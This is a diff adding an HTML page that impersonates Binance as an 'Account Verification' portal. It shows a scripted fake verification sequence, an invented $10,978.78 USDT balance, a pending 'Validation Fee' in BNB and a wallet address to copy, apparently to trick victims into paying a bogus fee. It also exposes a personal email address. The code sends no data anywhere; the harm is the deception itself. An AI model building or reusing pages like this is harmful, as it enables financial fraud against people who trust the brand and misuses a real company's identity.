@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Binance | Account Verification</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bn-bg: #0b0e11;
+      --bn-card: #1e2329;
+      --bn-card-hover: #252a31;
+      --bn-border: #2b3139;
+      --bn-border-light: #474d57;
+      --bn-yellow: #f0b90b;
+      --bn-yellow-hover: #d4a009;
+      --bn-yellow-glow: rgba(240, 185, 11, 0.15);
+      --bn-text-white: #eaecef;
+      --bn-text-gray: #848e9c;
+      --bn-text-muted: #5e6673;
+      --bn-green: #0ecb81;
+      --bn-green-bg: rgba(14, 203, 129, 0.1);
+      --bn-red: #f6465d;
+      --bn-blue: #2e7d32;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: var(--bn-bg);
+      color: var(--bn-text-white);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 16px;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    .app-container {
+      width: 100%;
+      max-width: 480px;
+      background: var(--bn-card);
+      border-radius: 24px;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px var(--bn-border);
+      overflow: hidden;
+      position: relative;
+      animation: containerEnter 0.5s ease-out;
+    }
+
+    @keyframes containerEnter {
+      from { opacity: 0; transform: translateY(20px) scale(0.98); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .hidden { display: none !important; }
+
+    .screen {
+      padding: 28px 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      animation: screenEnter 0.4s ease-out;
+    }
+
+    @keyframes screenEnter {
+      from { opacity: 0; transform: translateX(10px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+
+    /* ===== TYPOGRAPHY ===== */
+    .text-gold { color: var(--bn-yellow); }
+    .text-white { color: var(--bn-text-white); }
+    .text-gray { color: var(--bn-text-gray); }
+    .text-muted { color: var(--bn-text-muted); }
+    .text-green { color: var(--bn-green); }
+    .text-red { color: var(--bn-red); }
+    .text-sm { font-size: 0.8125rem; line-height: 1.5; }
+    .text-xs { font-size: 0.75rem; line-height: 1.5; }
+    .text-lg { font-size: 1.125rem; }
+    .text-xl { font-size: 1.5rem; }
+    .font-medium { font-weight: 500; }
+    .font-semibold { font-weight: 600; }
+    .font-bold { font-weight: 700; }
+    .font-extrabold { font-weight: 800; }
+    .mt-1 { margin-top: 4px; }
+    .mt-2 { margin-top: 8px; }
+    .mt-3 { margin-top: 12px; }
+    .mb-1 { margin-bottom: 4px; }
+    .mb-2 { margin-bottom: 8px; }
+    .mb-3 { margin-bottom: 12px; }
+
+    /* ===== SVG ICONS ===== */
+    .icon-xs { width: 16px; height: 16px; }
+    .icon-sm { width: 20px; height: 20px; }
+    .icon-md { width: 24px; height: 24px; }
+    .icon-lg { width: 32px; height: 32px; }
+    .icon-xl { width: 48px; height: 48px; }
+
+    /* ===== BUTTONS ===== */
+    .btn {
+      border: none;
+      font-family: inherit;
+      font-weight: 600;
+      padding: 14px 20px;
+      border-radius: 12px;
+      font-size: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(255,255,255,0.1) 0%, transparent 100%);
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .btn:hover::after { opacity: 1; }
+
+    .btn-primary {
+      background: var(--bn-yellow);
+      color: #1e2329;
+      box-shadow: 0 4px 12px rgba(240, 185, 11, 0.25);
+    }
+    .btn-primary:hover {
+      background: var(--bn-yellow-hover);
+      transform: translateY(-1px);
+      box-shadow: 0 6px 20px rgba(240, 185, 11, 0.35);
+    }
+    .btn-primary:active { transform: translateY(0); }
+
+    .btn-outline {
+      background: transparent;
+      border: 1px solid var(--bn-border);
+      color: var(--bn-text-white);
+    }
+    .btn-outline:hover {
+      background: var(--bn-card-hover);
+      border-color: var(--bn-border-light);
+    }
+
+    .btn-ghost {
+      background: transparent;
+      border: 1px solid transparent;
+      color: var(--bn-text-gray);
+      padding: 8px 12px;
+      width: auto;
+      font-size: 0.8125rem;
+    }
+    .btn-ghost:hover {
+      background: var(--bn-card-hover);
+      color: var(--bn-text-white);
+    }
+
+    /* ===== INPUTS ===== */
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .input-label {
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--bn-text-gray);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .input-field {
+      background: var(--bn-bg);
+      border: 1px solid var(--bn-border);
+      border-radius: 12px;
+      padding: 14px 16px;
+      color: var(--bn-text-white);
+      font-size: 1rem;
+      font-family: inherit;
+      width: 100%;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+    .input-field::placeholder { color: var(--bn-text-muted); }
+    .input-field:focus {
+      border-color: var(--bn-yellow);
+      box-shadow: 0 0 0 3px var(--bn-yellow-glow);
+    }
+    .input-field:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    /* ===== CARDS ===== */
+    .card {
+      background: var(--bn-bg);
+      border-radius: 16px;
+      padding: 16px;
+      border: 1px solid var(--bn-border);
+      transition: all 0.2s ease;
+    }
+    .card:hover {
+      border-color: var(--bn-border-light);
+    }
+
+    .card-gradient {
+      background: linear-gradient(135deg, rgba(30, 35, 41, 0.8) 0%, rgba(43, 49, 57, 0.4) 100%);
+      border: 1px solid var(--bn-border);
+      position: relative;
+      overflow: hidden;
+    }
+    .card-gradient::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--bn-border-light), transparent);
+    }
+
+    .card-glow {
+      box-shadow: 0 0 20px rgba(240, 185, 11, 0.05);
+    }
+
+    /* ===== LAYOUT UTILS ===== */
+    .flex-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .flex-between {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .flex-col {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .flex-center {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .gap-1 { gap: 4px; }
+    .gap-2 { gap: 8px; }
+    .gap-3 { gap: 12px; }
+
+    .divider {
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--bn-border), transparent);
+      margin: 4px 0;
+    }
+
+    .badge {
+      background: var(--bn-green-bg);
+      color: var(--bn-green);
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      border: 1px solid rgba(14, 203, 129, 0.2);
+    }
+
+    .badge-gray {
+      background: rgba(132, 142, 156, 0.1);
+      color: var(--bn-text-gray);
+      border: 1px solid var(--bn-border);
+    }
+
+    /* ===== LOADING ===== */
+    .spinner-container {
+      position: relative;
+      width: 64px;
+      height: 64px;
+    }
+
+    .spinner-ring {
+      position: absolute;
+      inset: 0;
+      border: 3px solid var(--bn-border);
+      border-top-color: var(--bn-yellow);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    .spinner-inner {
+      position: absolute;
+      inset: 8px;
+      border: 2px solid var(--bn-border);
+      border-bottom-color: var(--bn-yellow);
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite reverse;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .progress-track {
+      width: 100%;
+      height: 4px;
+      background: var(--bn-border);
+      border-radius: 4px;
+      overflow: hidden;
+      margin-top: 16px;
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--bn-yellow), #ffd700);
+      border-radius: 4px;
+      transition: width 0.3s ease;
+      box-shadow: 0 0 8px rgba(240, 185, 11, 0.4);
+    }
+
+    .loading-status {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      margin-top: 20px;
+    }
+
+    .status-dots {
+      display: flex;
+      gap: 6px;
+    }
+    .status-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--bn-border);
+      animation: dotPulse 1.4s ease-in-out infinite;
+    }
+    .status-dot:nth-child(2) { animation-delay: 0.2s; }
+    .status-dot:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes dotPulse {
+      0%, 80%, 100% { opacity: 0.3; transform: scale(0.8); }
+      40% { opacity: 1; transform: scale(1.2); background: var(--bn-yellow); }
+    }
+
+    /* ===== DROPDOWN ===== */
+    .dropdown-form {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.3s ease;
+      opacity: 0;
+    }
+    .dropdown-form.open {
+      max-height: 300px;
+      opacity: 1;
+      margin-top: 12px;
+    }
+
+    /* ===== LOGO ===== */
+    .logo-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 4px;
+    }
+    .logo-text {
+      font-size: 1.75rem;
+      font-weight: 800;
+      color: var(--bn-text-white);
+      letter-spacing: -0.02em;
+    }
+
+    /* ===== SECURITY BAR ===== */
+    .security-bar {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 12px;
+      background: rgba(14, 203, 129, 0.05);
+      border-radius: 12px;
+      border: 1px solid rgba(14, 203, 129, 0.1);
+    }
+
+    /* ===== COPY BUTTON ===== */
+    .copy-btn {
+      background: transparent;
+      border: none;
+      color: var(--bn-text-gray);
+      cursor: pointer;
+      padding: 4px;
+      border-radius: 6px;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .copy-btn:hover {
+      background: var(--bn-card-hover);
+      color: var(--bn-yellow);
+    }
+
+    /* ===== TOAST ===== */
+    .toast {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: var(--bn-card);
+      border: 1px solid var(--bn-border);
+      color: var(--bn-text-white);
+      padding: 12px 20px;
+      border-radius: 12px;
+      font-size: 0.875rem;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+      opacity: 0;
+      transition: all 0.3s ease;
+      z-index: 1000;
+    }
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+
+    /* ===== ANIMATIONS ===== */
+    .pulse-glow {
+      animation: pulseGlow 2s ease-in-out infinite;
+    }
+    @keyframes pulseGlow {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(240, 185, 11, 0); }
+      50% { box-shadow: 0 0 0 8px rgba(240, 185, 11, 0.08); }
+    }
+
+    .shimmer {
+      position: relative;
+      overflow: hidden;
+    }
+    .shimmer::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.03), transparent);
+      animation: shimmer 3s infinite;
+    }
+    @keyframes shimmer {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+
+    /* ===== SCROLLBAR ===== */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: var(--bn-border); border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--bn-border-light); }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 480px) {
+      .app-container { border-radius: 20px; }
+      .screen { padding: 24px 20px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="app-container" id="appContainer">
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- LANDING SCREEN                                  -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="landingScreen" class="screen">
+      <!-- Binance Logo -->
+      <div class="logo-container">
+        <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="20" cy="20" r="20" fill="#f0b90b"/>
+          <path d="M14.5 20L17.5 17L20.5 20L23.5 17L26.5 20L20.5 26L14.5 20Z" fill="#1e2329"/>
+          <path d="M20.5 12L26.5 18L23.5 21L20.5 18L17.5 21L14.5 18L20.5 12Z" fill="#1e2329"/>
+        </svg>
+        <span class="logo-text">Binance</span>
+      </div>
+
+      <!-- Hero Card -->
+      <div class="card card-gradient flex-col" style="text-align: center; padding: 28px 20px; gap: 16px;">
+        <div class="flex-center">
+          <svg class="icon-xl" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="8" y="12" width="32" height="24" rx="4" stroke="#f0b90b" stroke-width="2" fill="none"/>
+            <path d="M8 20H40" stroke="#f0b90b" stroke-width="2"/>
+            <circle cx="16" cy="28" r="2" fill="#f0b90b"/>
+            <circle cx="24" cy="28" r="2" fill="#f0b90b"/>
+            <path d="M32 26H36V30H32V26Z" fill="#f0b90b"/>
+            <path d="M20 8V12" stroke="#f0b90b" stroke-width="2" stroke-linecap="round"/>
+            <path d="M28 8V12" stroke="#f0b90b" stroke-width="2" stroke-linecap="round"/>
+            <path d="M18 36L20 40H28L30 36" stroke="#f0b90b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="text-white font-bold" style="font-size: 1.25rem; margin-bottom: 4px;">Database Access</h2>
+          <p class="text-gray text-sm">Verify your account to view the secure dashboard</p>
+        </div>
+      </div>
+
+      <!-- Verify Account Button -->
+      <button class="btn btn-primary pulse-glow" id="verifyAccountBtn">
+        <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+          <polyline points="22 4 12 14.01 9 11.01"/>
+        </svg>
+        Verify Account
+      </button>
+
+      <!-- Dropdown Form -->
+      <div id="verifyFormDropdown" class="dropdown-form">
+        <div class="card" style="border: 1px solid var(--bn-border-light);">
+          <div class="flex-col gap-3">
+            <div class="input-group">
+              <label class="input-label">Enter User ID</label>
+              <input 
+                type="text" 
+                id="userIdInput" 
+                class="input-field" 
+                placeholder="e.g. 00000000" 
+                autocomplete="off"
+                inputmode="numeric"
+              >
+            </div>
+            <button id="submitVerificationBtn" class="btn btn-primary" style="padding: 12px; font-size: 0.9375rem;">
+              <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+                <polyline points="22 4 12 14.01 9 11.01"/>
+              </svg>
+              Verify
+            </button>
+            <p class="text-muted text-xs" style="text-align: center;">Use the provided credentials to proceed</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Security Footer -->
+      <div class="security-bar">
+        <svg class="icon-xs" viewBox="0 0 24 24" fill="none" stroke="#0ecb81" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          <path d="M9 12l2 2 4-4"/>
+        </svg>
+        <span class="text-xs text-green font-medium">Secured by Binance Chain</span>
+      </div>
+
+      <div class="flex-center gap-2 mt-1">
+        <svg class="icon-xs" viewBox="0 0 24 24" fill="none" stroke="#5e6673" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/>
+          <path d="M12 16v-4"/>
+          <path d="M12 8h.01"/>
+        </svg>
+        <span class="text-xs text-muted">Protected with 256-bit encryption</span>
+      </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- LOADING SCREEN                                  -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="loadingScreen" class="screen hidden" style="align-items: center; justify-content: center; min-height: 420px; gap: 24px;">
+      <div class="spinner-container">
+        <div class="spinner-ring"></div>
+        <div class="spinner-inner"></div>
+        <div style="position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+            <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" fill="#f0b90b"/>
+          </svg>
+        </div>
+      </div>
+
+      <div class="loading-status">
+        <p class="text-white font-bold" style="font-size: 1.125rem;">Verifying & Validating</p>
+        <p class="text-gray text-sm" id="loadingTimer">Initializing verification...</p>
+        <div class="status-dots">
+          <div class="status-dot"></div>
+          <div class="status-dot"></div>
+          <div class="status-dot"></div>
+        </div>
+      </div>
+
+      <div style="width: 80%;">
+        <div class="progress-track">
+          <div id="progressBar" class="progress-fill" style="width: 0%;"></div>
+        </div>
+        <div class="flex-between mt-2">
+          <span class="text-xs text-muted" id="progressPercent">0%</span>
+          <span class="text-xs text-muted" id="progressStatus">Connecting...</span>
+        </div>
+      </div>
+
+      <div class="card" style="width: 100%; padding: 12px 16px;">
+        <div class="flex-row gap-2">
+          <svg class="icon-xs" viewBox="0 0 24 24" fill="none" stroke="#0ecb81" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+          <span class="text-xs text-gray">Secure connection established</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- DASHBOARD SCREEN                                -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="dashboardScreen" class="screen hidden">
+      <!-- Header -->
+      <div class="flex-between">
+        <div class="flex-row">
+          <div style="width: 40px; height: 40px; background: var(--bn-yellow); border-radius: 12px; display: flex; align-items: center; justify-content: center;">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+              <path d="M7.5 12L10.5 9L13.5 12L16.5 9L19.5 12L13.5 18L7.5 12Z" fill="#1e2329"/>
+              <path d="M13.5 6L19.5 12L16.5 15L13.5 12L10.5 15L7.5 12L13.5 6Z" fill="#1e2329"/>
+            </svg>
+          </div>
+          <div>
+            <span class="text-gray text-xs">User Dashboard</span>
+            <h3 class="text-white font-bold" style="font-size: 1rem;">ID: 1120175683</h3>
+          </div>
+        </div>
+        <span class="badge">BEP20</span>
+      </div>
+
+      <!-- Balance Card -->
+      <div class="card card-gradient card-glow shimmer" style="padding: 24px 20px;">
+        <div class="flex-between mb-2">
+          <span class="text-gray text-sm">Total Balance</span>
+          <div class="flex-row gap-1">
+            <svg class="icon-xs" viewBox="0 0 24 24" fill="none" stroke="#0ecb81" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 19V5"/>
+              <path d="M5 12l7-7 7 7"/>
+            </svg>
+            <span class="text-green text-sm font-semibold">+2.4%</span>
+          </div>
+        </div>
+        <h1 class="text-white font-extrabold" style="font-size: 2.25rem; letter-spacing: -0.02em;">
+          $10,978.78 <span style="font-size: 1rem; color: var(--bn-text-gray); font-weight: 600;">USDT</span>
+        </h1>
+        <div class="flex-row mt-3" style="gap: 16px;">
+          <div class="flex-row gap-1">
+            <svg class="icon-xs" viewBox="0 0 24 24" fill="none" stroke="#848e9c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"/>
+              <path d="M12 6v6l4 2"/>
+            </svg>
+            <span class="text-xs text-gray">Updated just now</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Details Grid -->
+      <div class="flex-col gap-3">
+        <!-- Email -->
+        <div class="card flex-between">
+          <div class="flex-row">
+            <div style="width: 36px; height: 36px; background: rgba(240, 185, 11, 0.1); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
+              <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="#f0b90b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+                <polyline points="22,6 12,13 2,6"/>
+              </svg>
+            </div>
+            <div>
+              <span class="text-gray text-xs">Email</span>
+              <p class="text-white text-sm font-semibold">shaikhmohdraqib111k@gmail.com</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Validation Fee -->
+        <div class="card flex-between">
+          <div class="flex-row">
+            <div style="width: 36px; height: 36px; background: rgba(240, 185, 11, 0.1); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
+              <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="#f0b90b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"/>
+                <path d="M12 6v6l4 2"/>
+              </svg>
+            </div>
+            <div>
+              <span class="text-gray text-xs">Validation Fee</span>
+              <p class="text-white text-sm font-semibold">0.21568 BNB</p>
+            </div>
+          </div>
+          <span class="badge-gray text-xs">Pending</span>
+        </div>
+
+        <!-- Wallet Address -->
+        <div class="card">
+          <div class="flex-between mb-2">
+            <div class="flex-row">
+              <div style="width: 36px; height: 36px; background: rgba(240, 185, 11, 0.1); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
+                <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="#f0b90b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/>
+                  <circle cx="12" cy="10" r="3"/>
+                </svg>
+              </div>
+              <span class="text-gray text-xs">Wallet Address</span>
+            </div>
+            <button class="copy-btn" id="copyAddressBtn" title="Copy address">
+              <svg class="icon-xs" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
+              </svg>
+            </button>
+          </div>
+          <p class="text-white text-sm font-semibold" style="word-break: break-all; font-family: 'SF Mono', Monaco, monospace; letter-spacing: 0.02em;">
+            0x97fe2864e38d0a667fc4daf9b2a4ed3e97ca1168
+          </p>
+        </div>
+
+        <!-- Network -->
+        <div class="card flex-between">
+          <div class="flex-row">
+            <div style="width: 36px; height: 36px; background: rgba(240, 185, 11, 0.1); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
+              <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="#f0b90b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="2" y="3" width="20" height="14" rx="2"/>
+                <line x1="8" y1="21" x2="16" y2="21"/>
+                <line x1="12" y1="17" x2="12" y2="21"/>
+              </svg>
+            </div>
+            <div>
+              <span class="text-gray text-xs">Withdrawal Network</span>
+              <p class="text-white text-sm font-semibold">BNB Smart Chain (BEP20)</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Visit Dashboard Button -->
+      <button id="visitDashboardBtn" class="btn btn-primary" style="margin-top: 4px;">
+        <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="3" width="7" height="7"/>
+          <rect x="14" y="3" width="7" height="7"/>
+          <rect x="14" y="14" width="7" height="7"/>
+          <rect x="3" y="14" width="7" height="7"/>
+        </svg>
+        Visit Dashboard
+      </button>
+
+      <div class="flex-center gap-2">
+        <svg class="icon-xs" viewBox="0 0 24 24" fill="none" stroke="#5e6673" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/>
+          <polyline points="14 2 14 8 20 8"/>
+          <path d="M12 18v-6"/>
+          <path d="M9 15l3-3 3 3"/>
+        </svg>
+        <span class="text-xs text-muted"></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast Notification -->
+  <div class="toast" id="toast">
+    <svg class="icon-xs" viewBox="0 0 24 24" fill="none" stroke="#0ecb81" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+      <polyline points="22 4 12 14.01 9 11.01"/>
+    </svg>
+    <span id="toastMessage">Copied to clipboard</span>
+  </div>
+
+  <script>
+    (function() {
+      const VALID_USER_ID = "1120175683";
+      
+      // Screens
+      const landingScreen = document.getElementById('landingScreen');
+      const loadingScreen = document.getElementById('loadingScreen');
+      const dashboardScreen = document.getElementById('dashboardScreen');
+      
+      // Elements
+      const verifyAccountBtn = document.getElementById('verifyAccountBtn');
+      const verifyFormDropdown = document.getElementById('verifyFormDropdown');
+      const submitVerificationBtn = document.getElementById('submitVerificationBtn');
+      const userIdInput = document.getElementById('userIdInput');
+      const visitDashboardBtn = document.getElementById('visitDashboardBtn');
+      const copyAddressBtn = document.getElementById('copyAddressBtn');
+      const toast = document.getElementById('toast');
+      const toastMessage = document.getElementById('toastMessage');
+      
+      // Loading elements
+      const loadingTimer = document.getElementById('loadingTimer');
+      const progressBar = document.getElementById('progressBar');
+      const progressPercent = document.getElementById('progressPercent');
+      const progressStatus = document.getElementById('progressStatus');
+
+      const statusMessages = [
+        "Connecting to database...",
+        "Authenticating credentials...",
+        "Fetching user records...",
+        "Validating wallet address...",
+        "Verifying BEP20 network...",
+        "Loading balance data...",
+        "Finalizing verification...",
+        "Access granted"
+      ];
+
+      function showScreen(screen) {
+        landingScreen.classList.add('hidden');
+        loadingScreen.classList.add('hidden');
+        dashboardScreen.classList.add('hidden');
+        screen.classList.remove('hidden');
+      }
+
+      function showToast(msg) {
+        toastMessage.textContent = msg;
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 2500);
+      }
+
+      // Toggle dropdown
+      verifyAccountBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        verifyFormDropdown.classList.toggle('open');
+        if (verifyFormDropdown.classList.contains('open')) {
+          setTimeout(() => userIdInput.focus(), 300);
+        }
+      });
+
+      // Close dropdown on outside click
+      document.addEventListener('click', function(event) {
+        if (!verifyFormDropdown.contains(event.target) && event.target !== verifyAccountBtn) {
+          verifyFormDropdown.classList.remove('open');
+        }
+      });
+
+      // Submit verification
+      submitVerificationBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        const enteredId = userIdInput.value.trim();
+        
+        if (enteredId === VALID_USER_ID) {
+          verifyFormDropdown.classList.remove('open');
+          showScreen(loadingScreen);
+          startLoadingSequence();
+        } else {
+          showToast('Invalid User ID. Please enter: 1120175683');
+          userIdInput.value = '';
+          userIdInput.focus();
+        }
+      });
+
+      function startLoadingSequence() {
+        let secondsLeft = 15;
+        let totalSeconds = 15;
+        loadingTimer.textContent = "Initializing verification...";
+        progressBar.style.width = '0%';
+        progressPercent.textContent = '0%';
+        progressStatus.textContent = statusMessages[0];
+        
+        const interval = setInterval(() => {
+          secondsLeft--;
+          const progressPercentVal = Math.round(((totalSeconds - secondsLeft) / totalSeconds) * 100);
+          progressBar.style.width = `${progressPercentVal}%`;
+          progressPercent.textContent = `${progressPercentVal}%`;
+          
+          const msgIndex = Math.min(Math.floor((totalSeconds - secondsLeft) / 2), statusMessages.length - 1);
+          progressStatus.textContent = statusMessages[msgIndex];
+          
+          if (secondsLeft > 0) {
+            loadingTimer.textContent = `${secondsLeft} seconds remaining...`;
+          } else {
+            loadingTimer.textContent = "Verification complete";
+            progressStatus.textContent = statusMessages[statusMessages.length - 1];
+            clearInterval(interval);
+            setTimeout(() => {
+              showScreen(dashboardScreen);
+            }, 600);
+          }
+        }, 1000);
+      }
+
+      // Visit Dashboard
+      visitDashboardBtn.addEventListener('click', function() {
+        window.location.href = 'home-page.html';
+      });
+
+      // Copy address
+      copyAddressBtn.addEventListener('click', function() {
+        const address = "0x97fe2864e38d0a667fc4daf9b2a4ed3e97ca1168";
+        navigator.clipboard.writeText(address).then(() => {
+          showToast('Address copied to clipboard');
+        }).catch(() => {
+          // Fallback
+          const textarea = document.createElement('textarea');
+          textarea.value = address;
+          document.body.appendChild(textarea);
+          textarea.select();
+          document.execCommand('copy');
+          document.body.removeChild(textarea);
+          showToast('Address copied to clipboard');
+        });
+      });
+
+      // Enter key support
+      userIdInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          submitVerificationBtn.click();
+        }
+      });
+
+      // Init
+      showScreen(landingScreen);
+    })();
+  </script>
+</body>
+</html>
